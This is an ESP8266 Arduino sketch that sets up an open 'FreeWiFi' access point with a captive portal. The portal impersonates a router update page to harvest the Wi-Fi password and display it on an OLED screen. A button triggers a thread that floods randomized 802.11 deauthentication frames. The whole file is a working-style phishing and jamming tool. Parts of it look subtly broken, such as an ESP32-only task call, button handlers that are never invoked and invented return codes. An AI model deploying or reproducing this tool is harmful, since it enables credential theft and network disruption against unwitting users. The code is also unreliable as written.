#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include "SSD1306.h"
#include <ezButton.h>

#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif

//_________________________________________________________________
SSD1306 display(0x3c, 4, 5); 
bool deAuth = false;
const int SHORT_PRESS_TIME = 500; 
const int LONG_PRESS_TIME  = 2000;
char ssid[20];

//----------------------------------------------------------------
// Captive Portal Prerequisites : -
//----------------------------------------------------------------
const char MAIN_page[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body>
<h3> UPDATE YOUR WIFI ROUTER</h3>
<form action="/update">
  Please Authorize to continue:<br>
  <input type="password" name="passwd" placeholder="PASSWORD">
  <br>
  <input type="submit" value="Submit">
</form> 
</body>
</html>
)=====";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer server(80); 

//ip on browser routine
void handleRoot() {
 String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", s); //Send web page
}
//submit button routine 
void handleForm() {
 String passwd = server.arg("passwd"); 
 Serial.print("Password:");
 Serial.println(passwd); 
 display.clear();
 display.setFont(ArialMT_Plain_10);
 display.drawString(0, 0, "Password Captured:");
 display.drawString(0, 20, passwd);
 display.display();
 WiFi.mode(WIFI_OFF);
 delay(15000);
 ESP.restart();
 //String s = "<a href='/'> Go Back </a>";
 //server.send(200, "text/html", s); //Send web page
}

//----------------------------------------------------------------
uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

enum SendPacketStatus {
    SEND_PACKET_SUCCESS,
    SEND_PACKET_WIFI_ERROR,
    SEND_PACKET_SEND_ERROR,
    SEND_PACKET_TIMEOUT_ERROR,
};

SendPacketStatus sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {
    wifi_set_channel(wifi_channel);
    for (int i = 0; i < tries; i++) {
        int ret = wifi_send_pkt_freedom(packet, packetSize, 0);
        if (ret == 0) {
            return SEND_PACKET_SUCCESS;
        } else if (ret == -1) {
            // WiFi error occurred
            return SEND_PACKET_WIFI_ERROR;
        } else if (ret == -2) {
            // Failed to send packet
            continue;
            } else if (ret == -3) {
// Packet transmission timeout
return SEND_PACKET_TIMEOUT_ERROR;
} else {
// Unknown error
return SEND_PACKET_SEND_ERROR;
}
}
return SEND_PACKET_TIMEOUT_ERROR;
}

void sendDeauthPackets() {
uint16_t channel = random(1, 14);
int numPackets = random(1, 6);
for (int i = 0; i < numPackets; i++) {
packet[10] = random(0x00, 0xFF);
packet[11] = random(0x00, 0xFF);
packet[12] = random(0x00, 0xFF);
packet[13] = random(0x00, 0xFF);
packet[14] = random(0x00, 0xFF);
packet[15] = random(0x00, 0xFF);
sendPacket(packet, sizeof(packet), channel, 10);
}
}

void deauthThread() {
while (1) {
if (deAuth) {
sendDeauthPackets();
}
delay(random(10, 200));
}
}

ezButton button(D1);

void shortPress() {
deAuth = true;
}

void longPress() {
WiFi.mode(WIFI_OFF);
ESP.restart();
}

void setup() {
Serial.begin(9600);
display.init();
display.flipScreenVertically();
display.setTextAlignment(TEXT_ALIGN_LEFT);
display.setFont(ArialMT_Plain_10);
display.drawString(0, 0, "Press Button:");
display.drawString(0, 20, "Short:Start Deauth");
display.drawString(0, 30, "Long:Restart");
display.display();
delay(2000);
WiFi.mode(WIFI_AP);
snprintf(ssid, 20, "FreeWiFi_%02X:%02X:%02X", ESP.getChipId() >> 16 & 0xFF, ESP.getChipId() >> 8 & 0xFF, ESP.getChipId() & 0xFF);
WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
WiFi.softAP(ssid, "");
dnsServer.start(DNS_PORT, "*", apIP);
server.on("/", handleRoot);
server.on("/update", HTTP_GET, handleForm);
server.begin();

button.setDebounceTime(50);
button.setShortPressTime(SHORT_PRESS_TIME);
button.setLongPressTime(LONG_PRESS_TIME);
button.begin();

xTaskCreatePinnedToCore(
    deauthThread,    /* Function to implement the task */
    "Deauth Task",   /* Name of the task */
    10000,           /* Stack size in words */
    NULL,            /* Task input parameter */
    0,               /* Priority of the task */
    NULL,            /* Task handle. */
    0                /* Core where the task should run */
);
}

void loop() {
dnsServer.processNextRequest();
server.handleClient();
button.loop();
if (deAuth) {
display.clear();
display.drawString(0, 0, "Deauthenticating");
display.display();
}
}




